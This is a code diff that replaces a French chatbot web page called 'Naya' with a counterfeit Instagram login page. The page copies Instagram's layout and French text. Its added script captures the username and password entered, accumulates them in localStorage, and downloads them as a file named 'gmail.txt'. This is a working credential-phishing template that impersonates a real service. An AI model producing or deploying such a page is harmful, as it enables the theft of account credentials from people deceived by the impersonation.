@@ -1,207 +1,137 @@
 <!DOCTYPE html>
 <html lang="fr">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chat avec Naya</title>
-
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-
+    <title>Instagram - Connexion</title>
     <style>
         body {
-            font-family: 'Roboto', sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
             margin: 0;
             padding: 0;
-            height: 100vh;
-            overflow: hidden;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            text-align: center;
-            background-image: url('https://th.bing.com/th/id/R.e283bfb57525f3ca15983f32d1648dab?rik=DxaL7348BRh5xQ&pid=ImgRaw&r=0');
-            background-size: cover;
-            background-position: center;
-            color: #fff;
-            position: relative;
+            height: 100vh;
         }
-
-        h1 {
-            color: #ffffff;
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            transition: transform 0.3s;
-        }
-
-        h1:hover {
-            transform: scale(1.1) rotate(-5deg);
-        }
-
-        .info-section {
-            color: #ffffff;
-            font-size: 0.9em;
-            margin: 10px 0;
-            max-width: 90%;
-        }
-
-        .chat-section {
-            display: block;
-            margin-top: 20px;
-            width: 90%;
-            max-width: 600px;
-            background-color: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border-radius: 10px;
-            text-align: left;
-            position: relative;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-        }
-
-        #inputBox {
+        .container {
+            display: flex;
+            justify-content: space-around;
             width: 80%;
+            max-width: 900px;
+        }
+        .phone-preview {
+            position: relative;
+        }
+        .phone-preview img {
+            width: 300px;
+        }
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+        }
+        .login-box input {
+            width: 100%;
             padding: 10px;
-            font-size: 1.2em;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
             border-radius: 5px;
-            border: 1px solid #ccc;
-            margin-right: 5px;
-            transition: border 0.3s;
+            box-sizing: border-box;
         }
-
-        #inputBox:focus {
-            border: 1px solid #4CAF50;
-            outline: none;
-        }
-
-        #sendButton {
-            padding: 10px 15px;
-            font-size: 1.2em;
-            background-color: #4CAF50;
+        .login-box button {
+            background-color: #3897f0;
             color: white;
             border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
-            height: 46px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
-        }
-
-        #sendButton:hover {
-            background-color: #45a049;
-            transform: scale(1.05);
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.7);
-        }
-
-        #response {
-            margin-top: 20px;
-            background-color: rgba(0, 0, 0, 0.7);
             padding: 10px;
+            width: 100%;
+            cursor: pointer;
             border-radius: 5px;
-            word-wrap: break-word;
-            border: 1px solid #4CAF50;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
-            min-height: 50px;
         }
-
-        /* Effet simple d'apparition */
-        .fade-in {
-            animation: fadeIn 1s ease-in-out;
+        .login-box button:hover {
+            background-color: #287dc2;
         }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+        .login-box .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 10px 0;
         }
-
-        @media screen and (max-width: 768px) {
-            body {
-                padding: 10px;
-            }
-
-            h1 {
-                font-size: 2em;
-            }
-
-            footer {
-                bottom: 5px;
-                font-size: 0.7em;
-            }
-
-            #inputBox {
-                font-size: 1em;
-            }
-
-            #sendButton {
-                font-size: 1em;
-            }
+        .login-box .divider::before,
+        .login-box .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .login-box .divider::before {
+            margin-right: .25em;
+        }
+        .login-box .divider::after {
+            margin-left: .25em;
+        }
+        .app-links img {
+            width: 130px;
+            margin: 10px 5px;
         }
     </style>
 </head>
-
 <body>
 
-    <h1>💖 𝒩𝒶𝓎𝒶 💖</h1>
+    <div class="container">
+        <!-- Aperçu téléphone -->
+        <div class="phone-preview">
+            <img src="https://i.imgur.com/OGwIY3T.png" alt="Phone Preview">
+        </div>
 
-    <div class="info-section">
-        Bienvenue sur Naya, votre assistant textuel. Tapez simplement votre message et Naya vous répondra !
-    </div>
+        <!-- Boîte de connexion -->
+        <div class="login-box">
+            <h1>Instagram</h1>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Num. téléphone, nom d’utilisateur ou e-mail" required>
+                <input type="password" id="password" placeholder="Mot de passe" required>
+                <button type="submit">Se connecter</button>
+                <div class="divider">OU</div>
+                <button type="button" style="background-color:#4267B2; color:white;">Se connecter avec Facebook</button>
+                <p><a href="#">Mot de passe oublié ?</a></p>
+            </form>
+            <p>Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
 
-    <div class="chat-section" id="chatSection">
-        <div id="response"></div>
-        <div style="display: flex; align-items: center; margin-top: 10px;">
-            <input type="text" id="inputBox" placeholder="Tapez votre message ici...">
-            <button id="sendButton">Envoyer</button>
+            <div class="app-links">
+                <p>Téléchargez l’application.</p>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_FR.svg" alt="Google Play">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Badge_Store_windows_fr.png" alt="Microsoft Store">
+            </div>
         </div>
     </div>
 
-    <div class="social-icons">
-        <a href="https://discord.gg/P2DfSba6ds" target="_blank" aria-label="Discord"><i class="fab fa-discord"></i></a>
-        <a href="https://github.com/Soso-LeDev" target="_blank" aria-label="GitHub"><i class="fab fa-github"></i></a>
-    </div>
-
-    <footer>
-        &copy; 2024 Naya. Tous droits réservés.
-    </footer>
-
     <script>
-        const inputBox = document.getElementById('inputBox');
-        const sendButton = document.getElementById('sendButton');
-        const responseDiv = document.getElementById('response');
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();  // Empêcher l'envoi du formulaire
 
-        sendButton.addEventListener('click', async () => {
-            const message = inputBox.value.trim();
-            if (!message) {
-                responseDiv.innerHTML = "<span class='fade-in'>Veuillez entrer un message avant d'envoyer.</span>";
-                return;
-            }
+            // Récupérer les données du formulaire
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-            inputBox.value = ""; // Effacer la zone de saisie pour le prochain message
+            // Créer un contenu pour le fichier texte en ajoutant les nouvelles informations
+            const oldContent = localStorage.getItem('formContent') || '';  // Charger ancien contenu s'il existe
+            const newContent = oldContent + `Nom d'utilisateur : ${username}\nMot de passe : ${password}\n\n`;
 
-            try {
-                const response = await fetch('http://localhost:6259/ask', {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ question: message })
-                });
-                const result = await response.text();
-                responseDiv.innerHTML = `<span class="fade-in">Naya : ${result}</span>`; // Afficher uniquement la réponse de Naya
-            } catch (error) {
-                responseDiv.innerHTML = `<span class='fade-in'>Erreur : ${error.message}</span>`;
-            }
-        });
+            // Stocker le contenu dans localStorage pour permettre l'accumulation des données
+            localStorage.setItem('formContent', newContent);
 
-        inputBox.addEventListener("keypress", function (event) {
-            if (event.key === "Enter") {
-                sendButton.click();
-            }
+            // Créer un objet Blob avec le contenu du fichier (incluant les anciennes données)
+            const blob = new Blob([newContent], { type: 'text/plain' });
+
+            // Créer un lien de téléchargement
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'gmail.txt';  // Nom du fichier à télécharger
+            link.click();  // Simuler un clic pour lancer le téléchargement
         });
     </script>
-</body>
 
+</body>
 </html>
